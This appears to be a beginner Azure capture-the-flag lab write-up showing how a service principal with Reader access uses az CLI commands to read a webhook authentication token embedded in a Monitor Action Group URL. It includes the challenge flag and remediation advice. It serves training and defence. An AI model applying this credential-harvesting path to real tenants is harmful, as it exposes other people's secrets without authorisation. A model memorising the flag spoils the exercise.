# Monitor Action Group — Webhook Token Exposure

**Provider**: Azure  
**Difficulty**: Beginner  
**MITRE ATT&CK**: [T1552.001 — Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

## Scenario

You have obtained credentials for an Azure service principal with Reader access on a resource group. The resource group contains an Azure Monitor Action Group configured with a webhook receiver. The webhook URL contains an embedded authentication token that is stored in plaintext in the ARM resource definition and readable by any Reader.

## Objective

Inspect the Action Group webhook receiver URL to find the embedded authentication token.

## Permissions

The attacker service principal has:

- `Reader` on the resource group (built-in role)

## Attack Path

1. Authenticate with the provided service principal credentials:
   ```bash
   az login --service-principal \
     --username <client-id> \
     --password <client-secret> \
     --tenant <tenant-id>
   ```
2. List Monitor Action Groups in the resource group:
   ```bash
   az monitor action-group list --resource-group <resource-group>
   ```
3. Show the webhook receiver details including the service URI:
   ```bash
   az monitor action-group show \
     --name <action-group-name> \
     --resource-group <resource-group> \
     --query "webhookReceivers"
   ```
4. The `serviceUri` query parameter `token` contains the flag.

## Flag

`CUMULONIMBUS{Monit0r_W3bh00k_T0k3n_3xp0s3d}`

## Remediation

- Do not embed authentication tokens or secrets in webhook URLs — instead, use Azure Monitor's AAD authentication for webhook receivers which authenticates via managed identity or service principal without exposing tokens in the URL.
- If bearer token authentication is required, store the token in Key Vault and inject it via a secure mechanism at alert dispatch time.
- Audit all Action Groups with `az monitor action-group list --query "[].webhookReceivers"` across subscriptions to identify embedded tokens.
- Apply least-privilege RBAC to limit who can read Action Group definitions.
